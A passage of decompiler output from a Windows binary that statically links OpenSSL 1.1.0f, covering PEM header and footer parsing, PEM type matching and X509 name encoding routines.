  v46 = v6 & 0x7FFFFFFF;
  if ( strncmp(Str1, "-----END ", 9ui64)
    || strncmp((const char *)v59[1], Str2, v46)
    || strncmp(&Str1[v46 + 9], "-----\n", 6ui64) )
  {
    sub_140024610(9, 109, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 799);
    goto LABEL_18;
  }
  v22 = v58;
  sub_1400B9DC0(v58);
  if ( (int)sub_1400B9DD0(v58, v11[1], &v56, v11[1], v56) >= 0 )
  {
    if ( (int)sub_1400B9D50((__int64)v22, &v11[1][v56], &v60) >= 0 )
    {
      v53 = v60 + v56 == 0;
      v54 = v60 + v56;
      v56 += v60;
      if ( !v53 )
      {
        v55 = v59;
        *v61 = v59[1];
        *v62 = v44[1];
        *v63 = v11[1];
        *v64 = v54;
        sub_14001D930(v55);
        sub_14001D930(v44);
        sub_14001D930(v11);
        sub_1400B9FA0(v22);
        return 1i64;
      }
    }
    else
    {
      sub_140024610(9, 109, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 813);
    }
  }
  else
  {
    sub_140024610(9, 109, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 808);
  }
LABEL_19:
  sub_140082280((__int64)v59);
  sub_140082280((__int64)v57);
  sub_140082280((__int64)v11);
  sub_1400B9FA0(v22);
  return 0i64;
}
// 1400A3C04: conditional instruction was optimized away because eax.4>=1
// 1400A373D: conditional instruction was optimized away because ecx.4>=1
// 1400A3915: conditional instruction was optimized away because ecx.4>=1
// 1400A3A46: conditional instruction was optimized away because ebx.4>=1
// 1400A3D33: variable 'v24' is possibly undefined
// 1400A3D33: variable 'v26' is possibly undefined
// 1400A3D33: variable 'v27' is possibly undefined
// 1400A3D39: variable 'v48' is possibly undefined
// 1400A3D39: variable 'v49' is possibly undefined
// 1400A3D3F: variable 'v35' is possibly undefined
// 1400A3D3F: variable 'v34' is possibly undefined
// 1400A3D3F: variable 'v37' is possibly undefined
// 1400A3D3F: variable 'v38' is possibly undefined
// 1400A3D45: variable 'v12' is possibly undefined
// 1400A3D45: variable 'v14' is possibly undefined
// 1400A3D45: variable 'v15' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400A3630: using guessed type char Str1[9];
// 1400A3630: using guessed type char Str2[2];

//----- (00000001400A3D50) ----------------------------------------------------
__int64 __fastcall sub_1400A3D50(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5)
{
  int v5; // ebp
  _BYTE *v7; // r12
  int *v10; // rax
  int *v11; // r13
  unsigned int v13; // edi
  _BYTE *i; // rax
  int v15; // edi
  unsigned int v16; // ebx
  _BYTE *j; // rax
  int v18; // ebx
  int v19; // ebx
  int k; // r14d
  int v21; // esi
  signed int v22; // ecx
  int v23; // eax
  int v24; // eax
  signed int v25; // [rsp+30h] [rbp-48h] BYREF
  int v26; // [rsp+34h] [rbp-44h]

  v5 = 0;
  v7 = 0i64;
  v10 = (int *)sub_1400B9FD0();
  v26 = 7;
  v11 = v10;
  if ( !v10 )
    goto LABEL_2;
  sub_1400BA180(v10);
  v13 = 0;
  for ( i = (_BYTE *)a2; *i; ++v13 )
  {
    if ( v13 >= 0x80000000 )
      break;
    ++i;
  }
  v15 = v13 & 0x7FFFFFFF;
  if ( (unsigned int)sub_14002A430(a1, (__int64)"-----BEGIN ", 0xBu) != 11
    || (unsigned int)sub_14002A430(a1, a2, v15) != v15
    || (unsigned int)sub_14002A430(a1, (__int64)"-----\n", 6u) != 6 )
  {
    goto LABEL_3;
  }
  v16 = 0;
  for ( j = (_BYTE *)a3; *j; ++v16 )
  {
    if ( v16 >= 0x80000000 )
      break;
    ++j;
  }
  v18 = v16 & 0x7FFFFFFF;
  if ( v18 )
  {
    if ( (unsigned int)sub_14002A430(a1, a3, v18) != v18 || (unsigned int)sub_14002A430(a1, (__int64)"\n", 1u) != 1 )
      goto LABEL_3;
  }
  v7 = sub_14001D8E0(0x2000ui64);
  if ( !v7 )
  {
LABEL_2:
    v26 = 65;
    goto LABEL_3;
  }
  v19 = a5;
  for ( k = 0; v19 > 0; v5 += v21 )
  {
    v21 = v19;
    if ( v19 > 5120 )
      v21 = 5120;
    if ( !(unsigned int)sub_1400BA190(v11, v7, &v25, (char *)(a4 + v5), v21) )
      goto LABEL_3;
    v22 = v25;
    if ( v25 )
    {
      v23 = sub_14002A430(a1, (__int64)v7, v25);
      v22 = v25;
      if ( v23 != v25 )
        goto LABEL_3;
    }
    k += v22;
    v19 -= v21;
  }
  sub_1400BA100(v11, v7, (unsigned int *)&v25);
  if ( v25 > 0 && (v24 = sub_14002A430(a1, (__int64)v7, v25), v24 != v25)
    || (unsigned int)sub_14002A430(a1, (__int64)"-----END ", 9u) != 9
    || (unsigned int)sub_14002A430(a1, a2, v15) != v15
    || (unsigned int)sub_14002A430(a1, (__int64)"-----\n", 6u) != 6 )
  {
LABEL_3:
    sub_14001DA40(v7, 0x2000i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 0x280u);
    sub_1400B9FA0(v11);
    sub_140024610(9, 114, v26, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 642);
    return 0i64;
  }
  sub_14001DA40(v7, 0x2000i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 0x27Cu);
  sub_1400B9FA0(v11);
  return (unsigned int)(k + v25);
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A4030) ----------------------------------------------------
__int64 __fastcall sub_1400A4030(char *a1, const char *a2)
{
  int v5; // eax
  __int64 v6; // rax
  int v7; // eax
  __int64 v8; // rax
  BOOL v9; // ebx
  __int64 v10; // rbx
  __int64 v11; // rcx
  char v12; // al
  __int64 v13; // rcx
  char v14; // al
  __int64 v15; // rcx
  char v16; // al
  __int64 v17; // rcx
  char v18; // al
  char v19; // al
  __int64 v20; // [rsp+40h] [rbp+18h] BYREF

  if ( !strcmp(a1, a2) )
    return 1i64;
  if ( !strcmp(a2, "ANY PRIVATE KEY") )
  {
    if ( !strcmp(a1, "ENCRYPTED PRIVATE KEY") )
      return 1i64;
    if ( !strcmp(a1, "PRIVATE KEY") )
      return 1i64;
    v5 = sub_1400A4410(a1, "PRIVATE KEY");
    if ( v5 > 0 )
    {
      v6 = sub_14002CD10(0i64, a1, v5);
      if ( v6 )
      {
        if ( *(_QWORD *)(v6 + 184) )
          return 1i64;
      }
    }
    return 0i64;
  }
  else if ( !strcmp(a2, "PARAMETERS") )
  {
    v7 = sub_1400A4410(a1, "PARAMETERS");
    if ( v7 > 0 && (v8 = sub_14002CD10(&v20, a1, v7)) != 0 )
    {
      v9 = *(_QWORD *)(v8 + 112) != 0i64;
      sub_140025890(v20);
      return v9;
    }
    else
    {
      return 0i64;
    }
  }
  else if ( !strcmp(a1, "X9.42 DH PARAMETERS") && !strcmp(a2, "DH PARAMETERS")
         || !strcmp(a1, "X509 CERTIFICATE") && !strcmp(a2, "CERTIFICATE")
         || !strcmp(a1, "NEW CERTIFICATE REQUEST") && !strcmp(a2, "CERTIFICATE REQUEST")
         || !strcmp(a1, "CERTIFICATE") && !strcmp(a2, "TRUSTED CERTIFICATE")
         || !strcmp(a1, "X509 CERTIFICATE") && !strcmp(a2, "TRUSTED CERTIFICATE") )
  {
    return 1i64;
  }
  else
  {
    v10 = 0i64;
    if ( !strcmp(a1, "CERTIFICATE") )
    {
      v11 = 0i64;
      while ( 1 )
      {
        v12 = a2[v11++];
        if ( v12 != aPkcs7[v11 - 1] )
          break;
        if ( v11 == 6 )
          return 1i64;
      }
    }
    if ( !strcmp(a1, "PKCS #7 SIGNED DATA") )
    {
      v13 = 0i64;
      while ( 1 )
      {
        v14 = a2[v13++];
        if ( v14 != aPkcs7[v13 - 1] )
          break;
        if ( v13 == 6 )
          return 1i64;
      }
    }
    if ( !strcmp(a1, "CERTIFICATE") )
    {
      v15 = 0i64;
      while ( 1 )
      {
        v16 = a2[v15++];
        if ( v16 != aCms[v15 - 1] )
          break;
        if ( v15 == 4 )
          return 1i64;
      }
    }
    v17 = 0i64;
    while ( 1 )
    {
      v18 = a1[v17++];
      if ( v18 != aPkcs7[v17 - 1] )
        break;
      if ( v17 == 6 )
      {
        while ( 1 )
        {
          v19 = a2[v10++];
          if ( v19 != aCms[v10 - 1] )
            break;
          if ( v10 == 4 )
            return 1i64;
        }
        return 0i64;
      }
    }
    return 0i64;
  }
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (00000001400A4340) ----------------------------------------------------
__int64 __fastcall sub_1400A4340(char **a1, void *a2, int a3)
{
  char *v3; // rbx
  int v6; // esi
  int v7; // edi
  int v8; // eax
  __int64 v9; // rdx
  char v10; // cl

  v3 = *a1;
  if ( a3 > 0 )
    memset(a2, 0, a3);
  v6 = 2 * a3;
  v7 = 0;
  if ( 2 * a3 <= 0 )
  {
LABEL_6:
    *a1 = v3;
    return 1i64;
  }
  else
  {
    while ( 1 )
    {
      v8 = sub_14003BD50(*v3);
      if ( v8 < 0 )
        break;
      ++v3;
      v9 = v7 / 2;
      v10 = ~(_BYTE)v7++;
      *((_BYTE *)a2 + v9) |= (_BYTE)v8 << (4 * (v10 & 1));
      if ( v7 >= v6 )
        goto LABEL_6;
    }
    sub_140024610(9, 101, 103, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_lib.c", 556);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A4410) ----------------------------------------------------
__int64 __fastcall sub_1400A4410(_BYTE *a1, const char *a2)
{
  unsigned int v2; // r9d
  unsigned int v3; // r8d
  int v4; // r11d
  _BYTE *i; // rax
  int v6; // r8d
  const char *j; // rax
  unsigned int v8; // r9d
  const char *v10; // r9
  const char *v11; // r9

  v2 = 0;
  v3 = 0;
  v4 = (int)a1;
  for ( i = a1; *i; ++v3 )
  {
    if ( v3 >= 0x80000000 )
      break;
    ++i;
  }
  v6 = v3 & 0x7FFFFFFF;
  for ( j = a2; *j; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++j;
  }
  v8 = v2 & 0x7FFFFFFF;
  if ( (int)(v8 + 1) < v6
    && (v10 = &a1[(unsigned int)v6 - (unsigned __int64)v8], !strcmp(v10, a2))
    && (v11 = v10 - 1, *v11 == 32) )
  {
    return (unsigned int)((_DWORD)v11 - v4);
  }
  else
  {
    return 0i64;
  }
}

//----- (00000001400A44B0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400A44B0(_QWORD *a1)
{
  _DWORD *v2; // rax

  v2 = sub_140027200();
  *a1 = v2;
  return v2 != 0i64;
}

//----- (00000001400A44E0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400A44E0(_QWORD *a1)
{
  _DWORD *v2; // rax

  v2 = sub_1400273B0();
  *a1 = v2;
  return v2 != 0i64;
}

//----- (00000001400A4510) ----------------------------------------------------
void __fastcall sub_1400A4510(__int64 **a1, __int64 a2)
{
  __int64 *v3; // rcx

  v3 = *a1;
  if ( v3 )
  {
    if ( (*(_BYTE *)(a2 + 32) & 1) != 0 )
      sub_140026A10(v3);
    else
      sub_140026FF0(v3);
    *a1 = 0i64;
  }
}

//----- (00000001400A4560) ----------------------------------------------------
__int64 __fastcall sub_1400A4560(__int64 *a1, _BYTE *a2)
{
  __int64 v2; // rdi
  int v5; // eax
  BOOL v6; // esi

  v2 = *a1;
  if ( !*a1 )
    return 0xFFFFFFFFi64;
  v5 = sub_140027260(*a1) & 7;
  v6 = v5 == 0;
  if ( a2 )
  {
    if ( !v5 )
      *a2++ = 0;
    sub_1400269C0(v2, a2);
  }
  return (unsigned int)(v6 + (int)(sub_140027260(v2) + 7) / 8);
}

//----- (00000001400A45F0) ----------------------------------------------------
__int64 __fastcall sub_1400A45F0(__int64 *a1, _BYTE *a2, int a3, __int64 a4, int a5, __int64 a6)
{
  _DWORD *v9; // rax
  __int64 *v10; // rcx
  __int64 result; // rax

  if ( !*a1 )
  {
    v9 = sub_140027200();
    *a1 = (__int64)v9;
    if ( !v9 )
      return 0i64;
  }
  if ( !sub_140026840(a2, a3, *a1) )
  {
    v10 = (__int64 *)*a1;
    if ( *a1 )
    {
      if ( (*(_BYTE *)(a6 + 32) & 1) != 0 )
      {
        sub_140026A10(v10);
        result = 0i64;
        *a1 = 0i64;
        return result;
      }
      sub_140026FF0(v10);
      *a1 = 0i64;
    }
    return 0i64;
  }
  return 1i64;
}

//----- (00000001400A46A0) ----------------------------------------------------
__int64 __fastcall sub_1400A46A0(__int64 *a1, _BYTE *a2, int a3, unsigned int a4, int a5, __int64 a6)
{
  if ( !*a1 )
    *a1 = (__int64)sub_1400273B0();
  return sub_1400A45F0(a1, a2, a3, a4, a5, a6);
}

//----- (00000001400A4700) ----------------------------------------------------
__int64 __fastcall sub_1400A4700(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = sub_140023320(a1, *a2);
  if ( (_DWORD)result )
    return (int)sub_14002A1A0(a1, (__int64)"\n") > 0;
  return result;
}

//----- (00000001400A4750) ----------------------------------------------------
void *sub_1400A4750()
{
  return &unk_140119E88;
}

//----- (00000001400A4760) ----------------------------------------------------
void *sub_1400A4760()
{
  return &unk_140119EB8;
}

//----- (00000001400A4770) ----------------------------------------------------
__int64 __fastcall sub_1400A4770(__int64 a1, __int64 a2, __int64 a3)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a3 + 80) + 8i64))();
}

//----- (00000001400A4790) ----------------------------------------------------
__int64 __fastcall sub_1400A4790(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a4 + 80) + 24i64))();
}

//----- (00000001400A47B0) ----------------------------------------------------
void *sub_1400A47B0()
{
  return &unk_140119F40;
}

//----- (00000001400A47C0) ----------------------------------------------------
void *sub_1400A47C0()
{
  return &unk_14011A000;
}

//----- (00000001400A47D0) ----------------------------------------------------
__int64 __fastcall sub_1400A47D0(__int64 *a1, void **a2)
{
  __int64 v2; // rbx
  __int64 result; // rax
  const void **v5; // rdx
  size_t v6; // rsi

  v2 = *a1;
  if ( !*(_DWORD *)(*a1 + 8)
    || (result = sub_1400A5290(*a1), (int)result >= 0) && (result = sub_1400A5070(v2), (int)result >= 0) )
  {
    v5 = *(const void ***)(v2 + 16);
    v6 = *(int *)v5;
    if ( a2 )
    {
      memmove(*a2, v5[1], v6);
      *a2 = (char *)*a2 + v6;
    }
    return (unsigned int)v6;
  }
  return result;
}

//----- (00000001400A4840) ----------------------------------------------------
__int64 __fastcall sub_1400A4840(void ****a1)
{
  int v1; // eax
  void ***v3; // rbx
  void **v4; // rax
  void **v5; // rax
  __int64 result; // rax

  v3 = (void ***)sub_14001DC20((unsigned int)(v1 - 8));
  if ( v3
    && (v4 = (void **)sub_1400296C0(), (*v3 = v4) != 0i64)
    && (v5 = (void **)sub_1400825B0(), (v3[2] = v5) != 0i64) )
  {
    *((_DWORD *)v3 + 2) = 1;
    result = 1i64;
    *a1 = v3;
  }
  else
  {
    sub_140024610(13, 171, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_name.c", 105);
    if ( v3 )
    {
      sub_1400294B0(*v3);
      sub_14001D930(v3);
    }
    return 0i64;
  }
  return result;
}
// 1400A485A: variable 'v1' is possibly undefined

//----- (00000001400A4900) ----------------------------------------------------
void __fastcall sub_1400A4900(__int64 *a1)
{
  __int64 v2; // rdi

  if ( a1 )
  {
    v2 = *a1;
    if ( *a1 )
    {
      sub_140082280(*(_QWORD *)(v2 + 16));
      sub_140029720(*(void **)v2, (void (*)(void))sub_1400A4C20);
      sub_14001D930(*(void **)(v2 + 24));
      sub_14001D930((void *)v2);
      *a1 = 0i64;
    }
  }
}

//----- (00000001400A4980) ----------------------------------------------------
__int64 __fastcall sub_1400A4980(__int64 a1, unsigned int ***a2, int a3, __int64 a4, __int64 a5)
{
  int v5; // eax
  unsigned int v6; // ecx

  v5 = sub_14005F0A0(a1, *a2, a3, *(_DWORD *)(a5 + 4));
  v6 = 2;
  if ( v5 <= 0 )
    return 0;
  return v6;
}

//----- (00000001400A49C0) ----------------------------------------------------
void *sub_1400A49C0()
{
  return &unk_14011A160;
}

//----- (00000001400A49D0) ----------------------------------------------------
void *sub_1400A49D0()
{
  return &unk_14011A110;
}

//----- (00000001400A49E0) ----------------------------------------------------
__int64 __fastcall sub_1400A49E0(
        __int64 *a1,
        char **a2,
        int a3,
        __int64 a4,
        unsigned int a5,
        int a6,
        char a7,
        __int64 a8)
{
  char *v8; // rdi
  unsigned int v9; // r10d
  __int64 result; // rax
  int v13; // eax
  void ***v14; // rbx
  int v15; // ebp
  unsigned int *v16; // rsi
  int v17; // edi
  __int64 v18; // rax
  unsigned int v19; // edi
  char *v20; // rcx
  char *v21; // [rsp+40h] [rbp-28h] BYREF
  void ***v22; // [rsp+48h] [rbp-20h] BYREF
  void *v23; // [rsp+78h] [rbp+10h] BYREF

  v8 = *a2;
  v9 = 0x100000;
  if ( a3 <= 0x100000 )
    v9 = a3;
  v21 = *a2;
  v23 = 0i64;
  v22 = 0i64;
  result = sub_140051760((__int64 *)&v23, &v21, v9, (__int64)&unk_14011A1B0, a5, a6, a7, a8);
  if ( (int)result > 0 )
  {
    if ( *a1 )
      sub_1400A4900(a1);
    v13 = sub_1400A4840(&v22);
    v14 = v22;
    if ( v13 && sub_1400822F0((__int64)v22[2], v21 - v8) )
    {
      memmove(v14[2][1], v8, v21 - v8);
      v15 = 0;
      if ( (int)sub_1400296E0((unsigned int *)v23) <= 0 )
      {
LABEL_13:
        v19 = sub_1400A5070((__int64)v14);
        if ( v19 )
        {
          sub_140029720(v23, (void (*)(void))sub_1400A5030);
          *((_DWORD *)v14 + 2) = 0;
          result = v19;
          v20 = v21;
          *a1 = (__int64)v14;
          *a2 = v20;
          return result;
        }
      }
      else
      {
        while ( 1 )
        {
          v16 = (unsigned int *)sub_140029880((__int64)v23, v15);
          v17 = 0;
          if ( (int)sub_1400296E0(v16) > 0 )
            break;
LABEL_12:
          if ( ++v15 >= (int)sub_1400296E0((unsigned int *)v23) )
            goto LABEL_13;
        }
        while ( 1 )
        {
          v18 = sub_140029880((__int64)v16, v17);
          *(_DWORD *)(v18 + 16) = v15;
          if ( !(unsigned int)sub_1400297C0((int *)*v14, v18) )
            break;
          sub_1400297E0((__int64)v16, v17++, 0i64);
          if ( v17 >= (int)sub_1400296E0(v16) )
            goto LABEL_12;
        }
      }
    }
    if ( v14 )
      sub_140051250((unsigned int *)v14, (__int64)&unk_14011A218);
    sub_140029720(v23, (void (*)(void))sub_1400A5050);
    sub_140024610(13, 158, 58, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_name.c", 206);
    return 0i64;
  }
  return result;
}

//----- (00000001400A4C00) ----------------------------------------------------
__int64 __fastcall sub_1400A4C00(unsigned int *a1)
{
  return sub_140050AA0((__int64)&unk_14011A110, a1);
}

//----- (00000001400A4C20) ----------------------------------------------------
void __fastcall sub_1400A4C20(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011A110);
}

//----- (00000001400A4C40) ----------------------------------------------------
__int64 sub_1400A4C40()
{
  return sub_140050B70((__int64)&unk_14011A110);
}

//----- (00000001400A4C60) ----------------------------------------------------
__int64 __fastcall sub_1400A4C60(unsigned int *a1)
{
  return sub_140050AA0((__int64)&unk_14011A218, a1);
}

//----- (00000001400A4C80) ----------------------------------------------------
void __fastcall sub_1400A4C80(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011A218);
}

//----- (00000001400A4CA0) ----------------------------------------------------
void *sub_1400A4CA0()
{
  return &unk_14011A218;
}

//----- (00000001400A4CB0) ----------------------------------------------------
__int64 sub_1400A4CB0()
{
  return sub_140050B70((__int64)&unk_14011A218);
}

//----- (00000001400A4CD0) ----------------------------------------------------
__int64 __fastcall sub_1400A4CD0(__int64 a1, unsigned int **a2)
{
  __int64 result; // rax
  void *v4; // rbp
  _BYTE *v5; // rbx
  __int64 v6; // rsi
  char v7; // al

  result = (__int64)sub_1400A9CD0(a2, 0i64, 0);
  v4 = (void *)result;
  if ( result )
  {
    if ( !*(_BYTE *)result )
    {
      sub_14001D930((void *)result);
      return 1i64;
    }
    v5 = (_BYTE *)(result + 1);
    v6 = result + 1;
    while ( 1 )
    {
      if ( *v5 == 47
        && (unsigned __int8)(v5[1] - 65) <= 0x19u
        && ((v7 = v5[2], v7 == 61) || (unsigned __int8)(v7 - 65) <= 0x19u && v5[3] == 61)
        || !*v5 )
      {
        if ( (unsigned int)sub_14002A430(a1, v6, (int)v5 - (int)v6) != (_DWORD)v5 - (_DWORD)v6 )
          goto LABEL_17;
        v6 = (__int64)(v5 + 1);
        if ( !*v5 )
        {
LABEL_16:
          sub_14001D930(v4);
          return 1i64;
        }
        if ( (unsigned int)sub_14002A430(a1, (__int64)", ", 2u) != 2 )
        {
LABEL_17:
          sub_140024610(11, 117, 7, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_name.c", 541);
          sub_14001D930(v4);
          return 0i64;
        }
        if ( !*v5 )
          goto LABEL_16;
      }
      ++v5;
    }
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A4E30) ----------------------------------------------------
_BOOL8 __fastcall sub_1400A4E30(__int64 a1, __int64 a2)
{
  _BOOL8 result; // rax
  int v5; // eax
  int v6; // esi
  char *v7; // rbx
  char *v8; // rdi
  unsigned __int8 *v9; // r14
  int v10; // edi
  unsigned __int8 v11; // al
  char v12; // al

  if ( (sub_1400517D0(*(_DWORD *)(a2 + 4)) & 0x2956) == 0 )
    return (unsigned int)sub_1400473E0(a1, a2) != 0;
  *(_DWORD *)(a1 + 4) = 12;
  v5 = sub_14005F010((_QWORD *)(a1 + 8), a2);
  *(_DWORD *)a1 = v5;
  v6 = v5;
  if ( v5 == -1 )
    return 0i64;
  v7 = *(char **)(a1 + 8);
  if ( v5 > 0 )
  {
    do
    {
      if ( *v7 < 0 )
        break;
      if ( !isspace((unsigned __int8)*v7) )
        break;
      ++v7;
      --v6;
    }
    while ( v6 > 0 );
  }
  if ( v6 > 0 )
  {
    v8 = &v7[v6 - 1];
    do
    {
      if ( *v8 < 0 )
        break;
      if ( !isspace((unsigned __int8)*v8) )
        break;
      --v8;
      --v6;
    }
    while ( v6 > 0 );
  }
  v9 = *(unsigned __int8 **)(a1 + 8);
  v10 = 0;
  while ( v10 < v6 )
  {
    v11 = *v7;
    if ( *v7 >= 0 )
    {
      if ( isspace(v11) )
      {
        *v9++ = 32;
        do
        {
          v12 = *++v7;
          ++v10;
        }
        while ( v12 >= 0 && isspace((unsigned __int8)v12) );
        continue;
      }
      v11 = tolower((unsigned __int8)*v7);
    }
    *v9 = v11;
    ++v7;
    ++v9;
    ++v10;
  }
  result = 1i64;
  *(_DWORD *)a1 = (_DWORD)v9 - *(_DWORD *)(a1 + 8);
  return result;
}

//----- (00000001400A4F80) ----------------------------------------------------
__int64 __fastcall sub_1400A4F80(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_14011A218);
}

//----- (00000001400A4FA0) ----------------------------------------------------
__int64 __fastcall sub_1400A4FA0(unsigned int *a1, unsigned __int8 **a2)
{
  unsigned int v2; // edi
  int v4; // ebx
  __int64 result; // rax
  unsigned int *v7; // [rsp+40h] [rbp+8h] BYREF

  v2 = 0;
  v4 = 0;
  if ( (int)sub_1400296E0(a1) <= 0 )
    return v2;
  while ( 1 )
  {
    v7 = (unsigned int *)sub_140029880((__int64)a1, v4);
    result = sub_140053350(&v7, a2, (__int64)&unk_14011A160, -1, -1);
    if ( (int)result < 0 )
      break;
    v2 += result;
    if ( ++v4 >= (int)sub_1400296E0(a1) )
      return v2;
  }
  return result;
}

//----- (00000001400A5030) ----------------------------------------------------
void __fastcall sub_1400A5030(void **a1)
{
  sub_1400294B0(a1);
}

//----- (00000001400A5050) ----------------------------------------------------
void __fastcall sub_1400A5050(void *a1)
{
  sub_140029720(a1, (void (*)(void))sub_1400A4C20);
}

//----- (00000001400A5070) ----------------------------------------------------
__int64 __fastcall sub_1400A5070(__int64 a1)
{
  void **v2; // rbp
  __int64 v3; // rbx
  int v4; // r12d
  unsigned int v5; // r13d
  unsigned int *v6; // rcx
  int *v8; // rsi
  int i; // r14d
  __int64 v10; // rdi
  void **v11; // rax
  __int64 v12; // rax
  int v13; // eax
  unsigned __int8 *v14; // rax
  unsigned __int8 *v15; // [rsp+70h] [rbp+8h] BYREF
  unsigned int *v16; // [rsp+78h] [rbp+10h] BYREF

  v2 = 0i64;
  v3 = 0i64;
  v4 = -1;
  v5 = 0;
  sub_14001D930(*(void **)(a1 + 24));
  v6 = *(unsigned int **)a1;
  *(_QWORD *)(a1 + 24) = 0i64;
  if ( (unsigned int)sub_1400296E0(v6) )
  {
    v8 = (int *)sub_1400296C0();
    if ( v8 )
    {
      for ( i = 0; i < (int)sub_1400296E0(*(unsigned int **)a1); ++i )
      {
        v10 = sub_140029880(*(_QWORD *)a1, i);
        if ( *(_DWORD *)(v10 + 16) != v4 )
        {
          v11 = (void **)sub_1400296C0();
          v2 = v11;
          if ( !v11 )
            goto LABEL_20;
          if ( !(unsigned int)sub_1400297C0(v8, (__int64)v11) )
          {
            sub_1400294B0(v2);
            goto LABEL_20;
          }
          v4 = *(_DWORD *)(v10 + 16);
        }
        v3 = sub_140050B70((__int64)&unk_14011A110);
        if ( !v3 )
          goto LABEL_21;
        v12 = sub_140047B90(*(_QWORD *)v10);
        *(_QWORD *)v3 = v12;
        if ( !v12
          || !sub_1400A4E30(*(_QWORD *)(v3 + 8), *(_QWORD *)(v10 + 8))
          || !(unsigned int)sub_1400297C0((int *)v2, v3) )
        {
          goto LABEL_21;
        }
      }
      v13 = sub_1400A4FA0((unsigned int *)v8, 0i64);
      v3 = 0i64;
      if ( v13 >= 0 )
      {
        *(_DWORD *)(a1 + 32) = v13;
        v14 = (unsigned __int8 *)sub_14001D8E0(v13);
        v15 = v14;
        if ( v14 )
        {
          *(_QWORD *)(a1 + 24) = v14;
          if ( (int)sub_1400296E0((unsigned int *)v8) > 0 )
          {
            do
            {
              v16 = (unsigned int *)sub_140029880((__int64)v8, v3);
              if ( (int)sub_140053350(&v16, &v15, (__int64)&unk_14011A160, -1, -1) < 0 )
                break;
              LODWORD(v3) = v3 + 1;
            }
            while ( (int)v3 < (int)sub_1400296E0((unsigned int *)v8) );
          }
          v5 = 1;
LABEL_20:
          v3 = 0i64;
        }
      }
    }
LABEL_21:
    sub_140051250((unsigned int *)v3, (__int64)&unk_14011A110);
    sub_140029720(v8, (void (*)(void))sub_1400A5050);
    return v5;
  }
  else
  {
    *(_DWORD *)(a1 + 32) = 0;
    return 1i64;
  }
}

//----- (00000001400A5290) ----------------------------------------------------
__int64 __fastcall sub_1400A5290(__int64 a1)
{
  int *v2; // rbx
  int v3; // ebp
  unsigned int *v4; // rax
  int v5; // esi
  __int64 v6; // rdi
  int *v7; // rax
  unsigned int v8; // ebx
  __int64 result; // rax
  unsigned int *v10; // [rsp+58h] [rbp+10h] BYREF
  unsigned __int8 *v11; // [rsp+60h] [rbp+18h] BYREF

  v10 = 0i64;
  v2 = 0i64;
  v3 = -1;
  v4 = (unsigned int *)sub_1400296C0();
  v10 = v4;
  if ( !v4 )
    goto LABEL_13;
  v5 = 0;
  if ( (int)sub_1400296E0(*(unsigned int **)a1) <= 0 )
  {
LABEL_9:
    v8 = sub_140053350(&v10, 0i64, (__int64)&unk_14011A1B0, -1, -1);
    if ( !sub_1400822F0(*(_QWORD *)(a1 + 16), (int)v8) )
      goto LABEL_12;
    v11 = *(unsigned __int8 **)(*(_QWORD *)(a1 + 16) + 8i64);
    sub_140053350(&v10, &v11, (__int64)&unk_14011A1B0, -1, -1);
    sub_140029720(v10, (void (*)(void))sub_1400A5030);
    result = v8;
    *(_DWORD *)(a1 + 8) = 0;
    return result;
  }
  while ( 1 )
  {
    v6 = sub_140029880(*(_QWORD *)a1, v5);
    if ( *(_DWORD *)(v6 + 16) != v3 )
      break;
LABEL_7:
    if ( !(unsigned int)sub_1400297C0(v2, v6) )
      goto LABEL_12;
    if ( ++v5 >= (int)sub_1400296E0(*(unsigned int **)a1) )
      goto LABEL_9;
  }
  v7 = (int *)sub_1400296C0();
  v2 = v7;
  if ( !v7 )
    goto LABEL_12;
  if ( (unsigned int)sub_1400297C0((int *)v10, (__int64)v7) )
  {
    v3 = *(_DWORD *)(v6 + 16);
    goto LABEL_7;
  }
  sub_1400294B0((void **)v2);
LABEL_12:
  v4 = v10;
LABEL_13:
  sub_140029720(v4, (void (*)(void))sub_1400A5030);
  sub_140024610(13, 203, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_name.c", 276);
  return 0xFFFFFFFFi64;
}

//----- (00000001400A5410) ----------------------------------------------------
void __fastcall sub_1400A5410(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011A380);
}

//----- (00000001400A5430) ----------------------------------------------------
__int64 __fastcall sub_1400A5430(__int64 a1, _DWORD *a2)
{
  __int64 v2; // rax
  _DWORD *v3; // rax

  v2 = *(_QWORD *)(a1 + 296);
  if ( !v2 )
    return 0i64;
